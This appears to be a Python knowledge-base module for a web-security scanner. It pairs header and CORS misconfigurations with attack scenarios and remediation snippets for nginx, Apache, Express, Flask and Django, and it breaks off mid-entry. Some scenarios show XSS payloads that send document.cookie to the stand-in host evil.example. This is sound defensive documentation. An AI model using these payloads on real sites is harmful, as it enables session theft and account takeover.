"""Vulnerability knowledge base for redveil.

A rich, per-finding content library that the checks consult when building
``Finding`` objects. Every entry is keyed by ``(check_id, issue_kind)`` and
contains:

- ``summary``: 2-3 sentence plain-language explanation.
- ``technical``: deep technical detail.
- ``attack_scenario``: step-by-step walkthrough of how an attacker would
  exploit this in the wild.
- ``impact``: concrete consequences with realistic examples.
- ``remediation``: list of specific actions with code/config snippets.
- ``code_examples``: dict mapping framework -> code snippet.

Checks call :func:`get_entry` to look up the content for a particular
``(check_id, kind)`` pair and merge it into the resulting ``Finding``. New
checks should add their entries here so reports stay consistent across the
framework.
"""
from __future__ import annotations

from typing import TypedDict


class VulnEntry(TypedDict, total=False):
    summary: str
    technical: str
    attack_scenario: str
    impact: str
    remediation: list[str]
    code_examples: dict[str, str]


# ---------------------------------------------------------------------------
# security-headers
# ---------------------------------------------------------------------------

MISSING_X_FRAME_OPTIONS: VulnEntry = {
    "summary": (
        "The X-Frame-Options header is not set, which means the response can "
        "be embedded inside a <frame>, <iframe>, <embed>, or <object> on any "
        "other website. This enables clickjacking attacks where victims are "
        "tricked into clicking hidden elements rendered in their authenticated "
        "session."
    ),
    "technical": (
        "Browsers consult the X-Frame-Options header (and the modern "
        "Content-Security-Policy ``frame-ancestors`` directive) to decide "
        "whether a page may be rendered inside a frame on another origin. "
        "When neither is present, browsers default to allowing framing from "
        "any origin. An attacker hosts your application inside an invisible "
        "iframe overlaid with attacker-controlled UI; the victim interacts "
        "with the framed page believing they are interacting with the "
        "attacker's surface, but every action executes inside their "
        "authenticated session on your application."
    ),
    "attack_scenario": (
        "1. Attacker hosts a page at https://evil.example with an invisible "
        "iframe pointing to https://target.example/account/settings\n"
        "2. The iframe is styled with opacity:0.001 and overlaid with a "
        "decoy UI such as a fake captcha or 'Watch Video' button\n"
        "3. Victim visits https://evil.example while logged into "
        "target.example in the same browser\n"
        "4. Victim clicks what appears to be 'Watch Video' but is actually "
        "the 'Delete Account' button underneath\n"
        "5. The destructive action executes in the victim's authenticated "
        "session and the victim never sees anything wrong"
    ),
    "impact": (
        "Clickjacking can be used to trick users into making unwanted "
        "financial transfers, changing account settings (recovery email, "
        "password, 2FA), granting OAuth or app permissions, deleting data, or "
        "following/unfollowing accounts. Severity escalates significantly "
        "when the framed page contains state-changing forms and the "
        "application lacks CSRF protection, because the click is interpreted "
        "as an intentional user action."
    ),
    "remediation": [
        "Add the header `X-Frame-Options: DENY` (most restrictive) or "
        "`SAMEORIGIN` if you legitimately embed your own pages in frames.",
        "Prefer the modern equivalent: Content-Security-Policy with "
        "`frame-ancestors 'none'` or `frame-ancestors 'self'`. CSP "
        "frame-ancestors supersedes X-Frame-Options in all modern browsers.",
        "Combine with a same-origin check on every state-changing form: if "
        "the request's Origin or Referer does not match your application, "
        "reject it (defense in depth against CSRF).",
    ],
    "code_examples": {
        "nginx": "add_header X-Frame-Options \"SAMEORIGIN\" always;",
        "apache": "Header always set X-Frame-Options \"SAMEORIGIN\"",
        "express": (
            "app.use((req, res, next) => {\n"
            "  res.setHeader('X-Frame-Options', 'SAMEORIGIN');\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "from flask import Flask\n"
            "app = Flask(__name__)\n"
            "@app.after_request\n"
            "def set_xfo(resp):\n"
            "    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'\n"
            "    return resp"
        ),
        "django": (
            "# settings.py — use django-security or set in middleware:\n"
            "SECURE_CONTENT_TYPE_NOSNIFF = True\n"
            "X_FRAME_OPTIONS = 'SAMEORIGIN'  # django >= 4.0\n"
            "# Or install django-security and add:\n"
            "# 'security.middleware.XFrameOptionsMiddleware'"
        ),
    },
}

MISSING_CSP: VulnEntry = {
    "summary": (
        "The Content-Security-Policy header is absent, leaving the "
        "application without a server-side policy that defines which scripts, "
        "styles, images, frames, and connections the browser should trust. "
        "Without CSP, any XSS bug becomes immediately exploitable and the "
        "blast radius of a single injection grows."
    ),
    "technical": (
        "Content-Security-Policy is a defense-in-depth header that whitelists "
        "the origins from which resources can be loaded and inline content "
        "that can execute. Modern browsers enforce CSP at parse time: a "
        "script tag whose source does not match the policy is blocked before "
        "it runs. CSP cannot fix an XSS bug, but it raises the cost of "
        "exploitation by forcing an attacker to either find a JSONP "
        "endpoint, abuse an allowed CDN, or compromise an allowed origin. "
        "Absent CSP, every stored, reflected, or DOM-based XSS sinks "
        "directly into the user's session."
    ),
    "attack_scenario": (
        "1. Attacker discovers a reflected XSS in https://target.example/search?q=\n"
        "2. Attacker crafts a link "
        "`https://target.example/search?q=<script>fetch('//evil.example/?c='+document.cookie)</script>`\n"
        "3. Attacker distributes the link via email, Slack, or social media\n"
        "4. Victim clicks the link while authenticated to target.example\n"
        "5. With CSP absent, the inline <script> executes and exfiltrates "
        "the session cookie to evil.example\n"
        "6. Attacker replays the cookie and impersonates the victim\n"
        "With a strict CSP (e.g. `script-src 'self'`) the inline script is "
        "blocked at parse time and the attack fails"
    ),
    "impact": (
        "Without CSP every XSS vulnerability is a direct credential theft or "
        "account takeover vector. CSP also limits the impact of clickjacking "
        "(via `frame-ancestors`), mixed-content issues (via "
        "`block-all-mixed-content`), and unauthorized iframe embedding. "
        "Absence of CSP increases the severity of any other client-side "
        "vulnerability and is a meaningful compliance gap (PCI-DSS, NIST "
        "800-53 SC-18)."
    ),
    "remediation": [
        "Add a strict CSP starting with `Content-Security-Policy: "
        "default-src 'self'; script-src 'self'; object-src 'none'; "
        "frame-ancestors 'none'; base-uri 'self'`.",
        "Avoid `unsafe-inline` and `unsafe-eval` — they disable the "
        "primary XSS-mitigation benefit of CSP. If you must allow inline "
        "scripts, switch to nonces or hashes (`script-src 'nonce-{random}'`).",
        "Deploy in Report-Only mode first (`Content-Security-Policy-Report-Only`) "
        "to collect violations before enforcing.",
        "Use `report-uri` or `report-to` to send violation reports to a "
        "logging endpoint for monitoring.",
    ],
    "code_examples": {
        "nginx": (
            "add_header Content-Security-Policy \"default-src 'self'; "
            "script-src 'self'; object-src 'none'; frame-ancestors 'none'; "
            "base-uri 'self'\" always;"
        ),
        "apache": (
            "Header always set Content-Security-Policy \"default-src 'self'; "
            "script-src 'self'; object-src 'none'; frame-ancestors 'none'"
        ),
        "express": (
            "const helmet = require('helmet');\n"
            "app.use(helmet.contentSecurityPolicy({\n"
            "  directives: {\n"
            "    defaultSrc: [\"'self'\"],\n"
            "    scriptSrc: [\"'self'\"],\n"
            "    objectSrc: [\"'none'\"],\n"
            "    frameAncestors: [\"'none'\"],\n"
            "  }\n"
            "}));"
        ),
        "flask": (
            "from flask_talisman import Talisman\n"
            "Talisman(app, content_security_policy={\n"
            "    'default-src': \"'self'\",\n"
            "    'script-src': \"'self'\",\n"
            "    'object-src': \"'none'\",\n"
            "    'frame-ancestors': \"'none'\"\n"
            "})"
        ),
        "django": (
            "# settings.py\n"
            "CSP_DEFAULT_SRC = (\"'self'\",)\n"
            "CSP_SCRIPT_SRC = (\"'self'\",)\n"
            "CSP_OBJECT_SRC = (\"'none'\",)\n"
            "CSP_FRAME_ANCESTORS = (\"'none'\",)\n"
            "# install django-csp and add its middleware"
        ),
    },
}

WILDCARD_CSP: VulnEntry = {
    "summary": (
        "The Content-Security-Policy header contains a wildcard source "
        "(`*`) or allows `unsafe-inline` / `unsafe-eval` for scripts. A CSP "
        "that trusts everything defeats the purpose of CSP — it provides no "
        "XSS mitigation beyond what an absent header would."
    ),
    "technical": (
        "CSP source expressions like `script-src *` or `script-src "
        "'unsafe-inline'` instruct the browser to allow loading scripts from "
        "any origin or executing any inline script, respectively. This is "
        "equivalent to having no CSP for XSS purposes. `unsafe-eval` allows "
        "`eval()`, `new Function()`, and similar dynamic code paths that "
        "bypass most static XSS protections. Browsers will still enforce "
        "frame-ancestors and form-action if those are set, but the script "
        "policy — the most security-critical part — is inert."
    ),
    "attack_scenario": (
        "1. Attacker finds any XSS sink, even a benign-looking one\n"
        "2. The injected payload uses `<script src=//evil.example/p.js>` "
        "or `<script>alert(1)</script>`\n"
        "3. With `script-src *` or `'unsafe-inline'`, the browser loads "
        "evil.example/p.js (or runs the inline script) without question\n"
        "4. evil.example/p.js exfiltrates session cookies, makes "
        "credentialed API calls, or defaces the page\n"
        "5. The attack succeeds even though CSP is 'set'"
    ),
    "impact": (
        "Effectively no XSS protection. Any inline script injection — "
        "reflected, stored, or DOM-based — runs unimpeded. The CSP header "
        "creates a false sense of security for developers and auditors who "
        "see it set and assume it is doing its job. It may still mitigate "
        "frame-based attacks if `frame-ancestors` is configured correctly, "
        "but for the most common modern XSS vectors it provides zero "
        "protection."
    ),
    "remediation": [
        "Replace `*` with an explicit allowlist of origins you trust to "
        "serve JavaScript: `script-src 'self' cdn.example.com`.",
        "Remove `unsafe-inline` and `unsafe-eval` from script-src. If you "
        "have inline scripts, switch to nonces (`'nonce-{random}'`) or "
        "hashes that rotate per-deploy.",
        "If you legitimately need third-party scripts, list each trusted "
        "origin explicitly rather than wildcarding.",
        "Run the report-only CSP first to inventory all the inline scripts "
        "and external sources your app uses, then build a strict policy.",
    ],
    "code_examples": {
        "nginx": (
            "# BAD: add_header Content-Security-Policy \"script-src *\" always;\n"
            "# GOOD:\n"
            "add_header Content-Security-Policy \"script-src 'self' "
            "https://cdn.example.com 'nonce-{random}'\" always;"
        ),
        "apache": (
            "# BAD: Header set Content-Security-Policy \"script-src * 'unsafe-inline' 'unsafe-eval'\"\n"
            "# GOOD:\n"
            "Header set Content-Security-Policy \"script-src 'self' https://cdn.example.com\""
        ),
        "express": (
            "app.use(helmet.contentSecurityPolicy({\n"
            "  directives: {\n"
            "    scriptSrc: [\"'self'\", \"https://cdn.example.com\"],\n"
            "    // NO 'unsafe-inline', NO 'unsafe-eval'\n"
            "  }\n"
            "}));"
        ),
        "flask": (
            "Talisman(app, content_security_policy={\n"
            "    'script-src': \"'self' https://cdn.example.com\"\n"
            "    # NO 'unsafe-inline' or 'unsafe-eval'\n"
            "})"
        ),
        "django": (
            "# Use django-csp. BAD: CSP_SCRIPT_SRC = (\"*\", \"'unsafe-inline'\")\n"
            "# GOOD:\n"
            "CSP_SCRIPT_SRC = (\"'self'\", \"https://cdn.example.com\")"
        ),
    },
}

MISSING_HSTS: VulnEntry = {
    "summary": (
        "The Strict-Transport-Security header is not set, so browsers will "
        "not enforce HTTPS for this domain. A network attacker on the same "
        "Wi-Fi, performing a man-in-the-middle attack, can intercept the "
        "first request to the site and serve HTTP content, capture session "
        "cookies, or inject content."
    ),
    "technical": (
        "HSTS tells the browser: 'for this domain, never speak HTTP — always "
        "use HTTPS for the next N seconds.' On the first visit, the browser "
        "sees the HSTS header on an HTTPS response and pins the policy for "
        "`max-age` seconds. On subsequent visits, even if the user types "
        "`http://` or clicks an `http://` link, the browser silently upgrades "
        "to HTTPS before issuing the request. Without HSTS, an attacker who "
        "intercepts the very first request — or any request after the "
        "policy expires — can serve content over HTTP, strip TLS, or redirect "
        "to a phishing site. This is the classic sslstrip attack vector."
    ),
    "attack_scenario": (
        "1. Victim joins coffee-shop Wi-Fi. Attacker on same network runs "
        "an ARP-spoofing / sslstrip tool\n"
        "2. Victim types `target.example` in the address bar — no scheme, "
        "browser tries HTTP first\n"
        "3. Attacker intercepts the plaintext HTTP request, "
        "strips the redirect-to-HTTPS, and proxies to the real site over "
        "HTTPS while serving an HTTP response to the victim\n"
        "4. Victim logs in: attacker captures credentials or session "
        "cookies in plaintext\n"
        "5. With HSTS `max-age=31536000` set on a previous session, the "
        "browser would have refused the HTTP request and upgraded to HTTPS "
        "before any attacker-controlled hop"
    ),
    "impact": (
        "Credential theft via sslstrip, session hijacking, and forced "
        "downgrade to plaintext HTTP. Particularly damaging for sites that "
        "set session cookies without the Secure flag — those cookies leak "
        "in plaintext over the intercepted HTTP. HSTS also protects against "
        "cookie theft via misconfigured TLS terminators and stray "
        "http:// links in legacy systems."
    ),
    "remediation": [
        "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; "
        "preload` to every HTTPS response.",
        "`max-age` of at least 1 year (31536000) is recommended; less than "
        "6 months is flagged by security headers scanners.",
        "Submit your domain to the HSTS preload list "
        "(https://hstspreload.org) so the policy is baked into browsers "
        "before the first visit.",
        "Ensure all subdomains serve HTTPS — `includeSubDomains` is "
        "dangerous if any subdomain is HTTP-only.",
    ],
    "code_examples": {
        "nginx": (
            "add_header Strict-Transport-Security "
            "\"max-age=31536000; includeSubDomains; preload\" always;"
        ),
        "apache": (
            "Header always set Strict-Transport-Security "
            "\"max-age=31536000; includeSubDomains; preload\""
        ),
        "express": (
            "app.use((req, res, next) => {\n"
            "  res.setHeader(\n"
            "    'Strict-Transport-Security',\n"
            "    'max-age=31536000; includeSubDomains; preload'\n"
            "  );\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "from flask_talisman import Talisman\n"
            "Talisman(app, strict_transport_security=True, "
            "strict_transport_security_max_age=31536000, "
            "strict_transport_security_include_subdomains=True, "
            "strict_transport_security_preload=True)"
        ),
        "django": (
            "# settings.py\n"
            "SECURE_HSTS_SECONDS = 31536000\n"
            "SECURE_HSTS_INCLUDE_SUBDOMAINS = True\n"
            "SECURE_HSTS_PRELOAD = True\n"
            "# Requires SECURE_SSL_REDIRECT = True and SECURE_PROXY_SSL_HEADER"
        ),
    },
}

SHORT_HSTS: VulnEntry = {
    "summary": (
        "The Strict-Transport-Security header is set but with a `max-age` "
        "below 1 year. A short max-age leaves a wider window for downgrade "
        "attacks: between expiry and re-pinning, the browser will once again "
        "honor `http://` requests, exposing users to sslstrip-style attacks."
    ),
    "technical": (
        "HSTS `max-age` is the number of seconds the browser should enforce "
        "the HTTPS-only policy. Industry guidance from HSTS preload list "
        "operators recommends at least 1 year. Browsers honor HSTS only "
        "after the first successful HTTPS visit — the policy is sticky for "
        "the configured duration. A short max-age (e.g. 300 seconds, 1 day) "
        "is functionally close to no HSTS for any user who visits less "
        "frequently than the expiry interval."
    ),
    "attack_scenario": (
        "1. Site sets `Strict-Transport-Security: max-age=300`\n"
        "2. Victim visits the site once, browser pins the 5-minute policy\n"
        "3. Victim returns 24 hours later — the policy has expired\n"
        "4. Attacker on the same network performs sslstrip on the next "
        "HTTP request and steals the session\n"
        "5. With `max-age=31536000`, the policy would still be in effect "
        "and the browser would refuse the HTTP request"
    ),
    "impact": (
        "Effectively equivalent to no HSTS protection for low-frequency "
        "visitors. Short max-ages also signal that the operator does not "
        "intend to maintain HTTPS long-term, which can fail compliance "
        "checks (PCI-DSS 4.1, NIST SC-8)."
    ),
    "remediation": [
        "Increase `max-age` to at least 31536000 (1 year).",
        "Add `includeSubDomains` and `preload` directives if all "
        "subdomains serve HTTPS.",
        "Submit the domain to https://hstspreload.org to bake the policy "
        "into browsers.",
        "Audit for any subdomain that is HTTP-only before adding "
        "`includeSubDomains` — preload submission will be rejected.",
    ],
    "code_examples": {
        "nginx": (
            "# BAD: add_header Strict-Transport-Security \"max-age=300\" always;\n"
            "# GOOD:\n"
            "add_header Strict-Transport-Security \"max-age=31536000; "
            "includeSubDomains; preload\" always;"
        ),
        "apache": (
            "Header always set Strict-Transport-Security "
            "\"max-age=31536000; includeSubDomains; preload\""
        ),
        "express": (
            "res.setHeader(\n"
            "  'Strict-Transport-Security',\n"
            "  'max-age=31536000; includeSubDomains; preload'\n"
            ");"
        ),
        "flask": (
            "Talisman(app, strict_transport_security_max_age=31536000, "
            "strict_transport_security_include_subdomains=True)"
        ),
        "django": "SECURE_HSTS_SECONDS = 31536000  # was too low",
    },
}

MISSING_X_CONTENT_TYPE_OPTIONS: VulnEntry = {
    "summary": (
        "The X-Content-Type-Options header is not set, allowing browsers to "
        "perform MIME-sniffing on responses. A text/plain response that the "
        "server intended as harmless text could be reinterpreted by the "
        "browser as HTML or JavaScript, enabling stored XSS even on "
        "endpoints that carefully set Content-Type."
    ),
    "technical": (
        "Browsers perform 'MIME sniffing' to guess the actual content type "
        "when the declared Content-Type is missing, generic (text/plain), "
        "or inconsistent with the response body. An attacker who can upload "
        "or store content via a text-typed endpoint can craft a payload that "
        "sniffs as HTML and executes scripts in the application's origin. "
        "Setting `X-Content-Type-Options: nosniff` instructs the browser to "
        "strictly honor the declared Content-Type and refuse to sniff."
    ),
    "attack_scenario": (
        "1. Application accepts user-uploaded text and stores it; "
        "serves it back with `Content-Type: text/plain`\n"
        "2. Attacker uploads a payload that begins with HTML "
        "(e.g. `<script>fetch('//evil.example/?c='+document.cookie)</script>`)\n"
        "3. Victim views the page; without nosniff the browser sniffs the "
        "body as HTML and executes the script\n"
        "4. Attacker's script runs in the application's origin and "
        "exfiltrates cookies or makes credentialed requests\n"
        "5. With `nosniff`, the browser would render the response as "
        "plaintext and the script would never execute"
    ),
    "impact": (
        "Stored XSS via MIME confusion — bypasses many application-level "
        "defenses because the developer believes the endpoint is 'just "
        "text'. Combined with a permissive CORS or same-origin XHR, "
        "attackers can read or modify sensitive data within the "
        "application's origin."
    ),
    "remediation": [
        "Add `X-Content-Type-Options: nosniff` to every response that "
        "serves user-controlled or untrusted content.",
        "Audit upload endpoints to ensure the server-supplied "
        "Content-Type matches the actual content (or set Content-Disposition "
        "to force download).",
        "Pair with a strong Content-Security-Policy so that even if a "
        "sniffing bypass succeeds, the inline script cannot run.",
    ],
    "code_examples": {
        "nginx": "add_header X-Content-Type-Options \"nosniff\" always;",
        "apache": "Header always set X-Content-Type-Options \"nosniff\"",
        "express": (
            "app.use((req, res, next) => {\n"
            "  res.setHeader('X-Content-Type-Options', 'nosniff');\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "@app.after_request\n"
            "def nosniff(resp):\n"
            "    resp.headers['X-Content-Type-Options'] = 'nosniff'\n"
            "    return resp"
        ),
        "django": "SECURE_CONTENT_TYPE_NOSNIFF = True  # in settings.py",
    },
}

UNSAFE_REFERRER_POLICY: VulnEntry = {
    "summary": (
        "The Referrer-Policy header is set to `unsafe-url` or "
        "`no-referrer-when-downgrade`, allowing the browser to send the full "
        "URL of the current page (including path and query parameters) to "
        "any external site the user navigates to. Query parameters often "
        "contain session tokens, search terms, or other sensitive data."
    ),
    "technical": (
        "When a user clicks an outbound link or loads an external resource, "
        "the browser sends the Referer header — the URL of the current page. "
        "`unsafe-url` sends the full URL regardless of protocol. "
        "`no-referrer-when-downgrade` sends the full URL to any destination "
        "as long as the destination is HTTPS (or HTTP, matching the source). "
        "Both leak sensitive path/query information. Safer values are "
        "`strict-origin-when-cross-origin` (default in modern browsers), "
        "`same-origin` (only same-origin requests get the full URL), or "
        "`no-referrer` (never send)."
    ),
    "attack_scenario": (
        "1. Application uses URL parameters to pass state, e.g. "
        "`/reset-password?token=abc123`\n"
        "2. Application does not set Referrer-Policy, so the browser "
        "defaults to `strict-origin-when-cross-origin` (or worse, an unsafe "
        "value)\n"
        "3. Victim loads the page, then clicks an outbound link to "
        "any third-party site (a forum, a help doc, etc.)\n"
        "4. The third-party site receives `Referer: "
        "https://target.example/reset-password?token=abc123`\n"
        "5. If the third party is malicious or compromised, the reset "
        "token is now in the access logs"
    ),
    "impact": (
        "Leakage of sensitive URL parameters (password reset tokens, "
        "internal search queries, file paths, debug flags) to any external "
        "destination the user visits. Many analytics platforms, ad "
        "networks, and partner sites collect Referer headers as a matter "
        "of routine — the data spreads quickly beyond your control."
    ),
    "remediation": [
        "Set `Referrer-Policy: strict-origin-when-cross-origin` (modern "
        "default) or stricter: `same-origin`, `no-referrer`, or "
        "`same-origin-strict-origin`.",
        "Avoid putting secrets in URLs altogether — use POST bodies for "
        "sensitive state.",
        "Audit existing usage of `unsafe-url` and "
        "`no-referrer-when-downgrade` in legacy configurations.",
    ],
    "code_examples": {
        "nginx": (
            "add_header Referrer-Policy \"strict-origin-when-cross-origin\" "
            "always;"
        ),
        "apache": (
            "Header always set Referrer-Policy \"strict-origin-when-cross-origin\""
        ),
        "express": (
            "app.use((req, res, next) => {\n"
            "  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "@app.after_request\n"
            "def set_rp(resp):\n"
            "    resp.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'\n"
            "    return resp"
        ),
        "django": "SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'",
    },
}

MISSING_PERMISSIONS_POLICY: VulnEntry = {
    "summary": (
        "The Permissions-Policy header is not set, allowing all embedded "
        "iframes, scripts, and images full access to powerful browser APIs "
        "such as camera, microphone, geolocation, and USB. While the "
        "policy is opt-in rather than blocking, its absence means a "
        "third-party script can quietly request access without your site's "
        "consent."
    ),
    "technical": (
        "Permissions-Policy (formerly Feature-Policy) is a response header "
        "that lets a site declare which browser features are allowed for "
        "the page and for any embedded content. Examples: "
        "`camera=(), microphone=(), geolocation=(self), usb=()`. When "
        "absent, the browser default is to permit everything. A third-party "
        "analytics script or ad tag can request `navigator.mediaDevices."
        "getUserMedia()` without the host page's explicit policy, and the "
        "browser will prompt the user (or silently allow in some legacy "
        "contexts)."
    ),
    "attack_scenario": (
        "1. Application includes a third-party analytics script "
        "(analytics.example.com)\n"
        "2. analytics.example.com is compromised or rebranded into a "
        "malicious network\n"
        "3. Malicious script calls `navigator.geolocation."
        "getCurrentPosition()` and exfiltrates the user's coordinates\n"
        "4. Or calls `navigator.usb.requestDevice()` to enumerate "
        "connected USB devices\n"
        "5. With `Permissions-Policy: geolocation=(), camera=()` set, the "
        "browser blocks these APIs entirely for the page and any embedded "
        "content"
    ),
    "impact": (
        "Reduced control over which browser features are exposed to "
        "first-party code, embedded iframes, and third-party scripts. "
        "Particularly relevant for sites serving content from ad networks, "
        "embedded videos, or chat widgets. Defense in depth: if a "
        "third-party tag is compromised, Permissions-Policy limits the "
        "blast radius."
    ),
    "remediation": [
        "Add a Permissions-Policy header that disables features you do not "
        "use: `Permissions-Policy: camera=(), microphone=(), geolocation=(), "
        "usb=(), payment=()`. Allow specific origins only for the features "
        "you need: `geolocation=(self)`.",
        "Audit embedded third-party scripts and tags; tighten policies to "
        "limit what each embedded origin can do.",
        "Test changes incrementally — some legacy code may rely on a "
        "feature you decide to disable.",
    ],
    "code_examples": {
        "nginx": (
            "add_header Permissions-Policy \"camera=(), microphone=(), "
            "geolocation=(), usb=()\" always;"
        ),
        "apache": (
            "Header always set Permissions-Policy \"camera=(), microphone=(), "
            "geolocation=()\""
        ),
        "express": (
            "app.use((req, res, next) => {\n"
            "  res.setHeader(\n"
            "    'Permissions-Policy',\n"
            "    'camera=(), microphone=(), geolocation=()'\n"
            "  );\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "@app.after_request\n"
            "def set_pp(resp):\n"
            "    resp.headers['Permissions-Policy'] = 'camera=(), microphone=()'\n"
            "    return resp"
        ),
        "django": (
            "# No built-in setting; use middleware:\n"
            "response['Permissions-Policy'] = 'camera=(), microphone=()'"
        ),
    },
}

IMPROPER_X_FRAME_OPTIONS: VulnEntry = {
    "summary": (
        "The X-Frame-Options header is set to a value other than `DENY` or "
        "`SAMEORIGIN` (for example `ALLOW-FROM`, `ALLOWALL`, or a typo). "
        "`ALLOW-FROM` is deprecated and ignored by modern browsers, and "
        "unknown values fall back to the browser default — which permits "
        "framing from any origin."
    ),
    "technical": (
        "The X-Frame-Options spec defines three values: `DENY`, "
        "`SAMEORIGIN`, and the deprecated `ALLOW-FROM <uri>`. `ALLOW-FROM` "
        "was removed from Chrome 78+ and Firefox 70+. The recommended "
        "modern replacement is the CSP `frame-ancestors` directive. If "
        "X-Frame-Options is set to an unknown value, browsers ignore the "
        "header and fall back to default-permit framing, which leaves the "
        "site vulnerable to clickjacking."
    ),
    "attack_scenario": (
        "1. Application sets `X-Frame-Options: ALLOW-FROM https://partner.example`\n"
        "2. Modern browsers (Chrome 78+, Firefox 70+) ignore this value\n"
        "3. Attacker hosts a clickjacking page framing target.example — "
        "browsers honor the missing header and allow framing\n"
        "4. Standard clickjacking attack proceeds as if the header were "
        "absent"
    ),
    "impact": (
        "Same impact as a missing X-Frame-Options header: clickjacking "
        "attacks against authenticated users, enabling state-changing "
        "actions via UI redress. The deprecated `ALLOW-FROM` value gives a "
        "false sense of security — operators believe they have configured "
        "framing restrictions when in fact no modern browser enforces "
        "them."
    ),
    "remediation": [
        "Replace `X-Frame-Options: ALLOW-FROM ...` with `DENY` or "
        "`SAMEORIGIN`, or migrate to CSP `frame-ancestors`.",
        "Use `Content-Security-Policy: frame-ancestors 'self'` (or "
        "`'none'`) to restrict framing in a way all modern browsers "
        "honor.",
        "Audit legacy configurations: any setting other than `DENY` or "
        "`SAMEORIGIN` is effectively broken.",
    ],
    "code_examples": {
        "nginx": (
            "# BAD: add_header X-Frame-Options \"ALLOW-FROM https://partner.example\" always;\n"
            "# GOOD:\n"
            "add_header X-Frame-Options \"SAMEORIGIN\" always;"
        ),
        "apache": (
            "# BAD: Header set X-Frame-Options \"ALLOW-FROM https://partner.example\"\n"
            "# GOOD:\n"
            "Header always set X-Frame-Options \"SAMEORIGIN\""
        ),
        "express": (
            "res.setHeader('X-Frame-Options', 'SAMEORIGIN');  // NOT ALLOW-FROM"
        ),
        "flask": (
            "resp.headers['X-Frame-Options'] = 'SAMEORIGIN'  # not ALLOW-FROM"
        ),
        "django": "X_FRAME_OPTIONS = 'SAMEORIGIN'  # was incorrectly ALLOW-FROM",
    },
}

# ---------------------------------------------------------------------------
# cors-policy
# ---------------------------------------------------------------------------

CORS_WILDCARD: VulnEntry = {
    "summary": (
        "The Access-Control-Allow-Origin header is set to `*`, allowing any "
        "website to read responses from this endpoint. For public, unauthenticated "
        "data this is usually acceptable, but for endpoints serving user "
        "data, internal configuration, or any sensitive information it is a "
        "data-exposure vulnerability."
    ),
    "technical": (
        "Cross-Origin Resource Sharing (CORS) is a browser-enforced policy "
        "that determines which origins may read responses from a server. "
        "`Access-Control-Allow-Origin: *` says 'any origin can read this "
        "response'. Browsers refuse to combine `*` with credentialed "
        "requests, so this is most dangerous for endpoints serving public "
        "data that becomes private in context (e.g. an API that returns "
        "user-specific data without authentication but exposes PII via a "
        "predictable path or query parameter). The header is set "
        "statically; it does not consider the requesting user, the "
        "endpoint, or the resource."
    ),
    "attack_scenario": (
        "1. Attacker hosts a page at https://evil.example\n"
        "2. JavaScript on evil.example issues `fetch('https://target.example/api/users/1')`\n"
        "3. Browser permits the request and reads the response because "
        "`Access-Control-Allow-Origin: *` is set\n"
        "4. Attacker exfiltrates the data to their server\n"
        "5. If the endpoint serves per-user data without authentication, "
        "the attacker harvests PII for any known user ID"
    ),
    "impact": (
        "Any data the endpoint serves is readable from any origin. For "
        "purely public, non-sensitive data (e.g. a public RSS feed) this is "
        "by design. For endpoints serving user data, internal configuration, "
        "or PII, this enables mass harvesting via cross-site scripting or "
        "an attacker's domain. A wildcard ACAO with credentialed requests "
        "is blocked by the browser, but a misconfigured CDN or proxy can "
        "strip the credentials header and honor the wildcard — see the "
        "wildcard_with_credentials entry."
    ),
    "remediation": [
        "Replace `*` with an explicit allowlist of trusted origins, "
        "validated server-side: e.g. "
        "`Access-Control-Allow-Origin: https://app.example.com`.",
        "If multiple origins are legitimate, respond with the single "
        "matching origin per request (echo the request origin only if it "
        "is on the allowlist).",
        "Pair with `Vary: Origin` so the response is not cached across "
        "origins.",
        "If credentials are required, never combine with `*`. Use a "
        "specific origin and set `Access-Control-Allow-Credentials: true`.",
    ],
    "code_examples": {
        "nginx": (
            "# BAD: add_header Access-Control-Allow-Origin \"*\" always;\n"
            "# GOOD: vary by Origin\n"
            "map $http_origin $cors_allow {\n"
            "    default \"\";\n"
            "    \"https://app.example.com\" \"https://app.example.com\";\n"
            "}\n"
            "add_header Access-Control-Allow-Origin $cors_allow always;\n"
            "add_header Vary \"Origin\" always;"
        ),
        "apache": (
            "# Use mod_headers + SetEnvIf\n"
            "SetEnvIf Origin \"^https://app\\.example\\.com$\" CORS_OK\n"
            "Header set Access-Control-Allow-Origin \"%{CORS_OK}e\" env=CORS_OK\n"
            "Header merge Vary \"Origin\""
        ),
        "express": (
            "const ALLOW = ['https://app.example.com'];\n"
            "app.use((req, res, next) => {\n"
            "  const origin = req.headers.origin;\n"
            "  if (ALLOW.includes(origin)) {\n"
            "    res.setHeader('Access-Control-Allow-Origin', origin);\n"
            "    res.setHeader('Vary', 'Origin');\n"
            "  }\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "from flask_cors import CORS\n"
            "CORS(app, origins=['https://app.example.com'])  # NOT '*'"
        ),
        "django": (
            "# settings.py\n"
            "CORS_ALLOWED_ORIGINS = ['https://app.example.com']  # NOT '*'\n"
            "# install django-cors-headers and add its middleware"
        ),
    },
}

CORS_REFLECTED: VulnEntry = {
    "summary": (
        "The server echoes whatever value the client sends in the `Origin` "
        "header back into `Access-Control-Allow-Origin`, with no allowlist "
        "check. This is functionally equivalent to setting the origin to "
        "`*` but also defeats the browser's refusal to combine `*` with "
        "credentials — meaning a cross-origin attacker can read responses "
        "in the victim's authenticated session."
    ),
    "technical": (
        "Origin reflection is a common anti-pattern: the server reads the "
        "incoming `Origin` header and copies it verbatim into "
        "`Access-Control-Allow-Origin`. Without an allowlist check, this "
        "permits any origin. Because the browser sees a specific origin in "
        "ACAO (not `*`), it will honor `Access-Control-Allow-Credentials: "
        "true` and include cookies on the request. The result: an "
        "attacker-controlled page can issue credentialed XHR to your API "
        "and read the responses as if it were the legitimate origin."
    ),
    "attack_scenario": (
        "1. Attacker hosts https://evil.example\n"
        "2. JavaScript on evil.example issues a credentialed fetch to "
        "https://target.example/api/me with the victim's cookies\n"
        "3. Browser sends the request with cookies; Origin: "
        "https://evil.example\n"
        "4. Server responds: `Access-Control-Allow-Origin: https://evil.example` "
        "and `Access-Control-Allow-Credentials: true`\n"
        "5. Browser permits evil.example to read the response, which "
        "contains the victim's profile data\n"
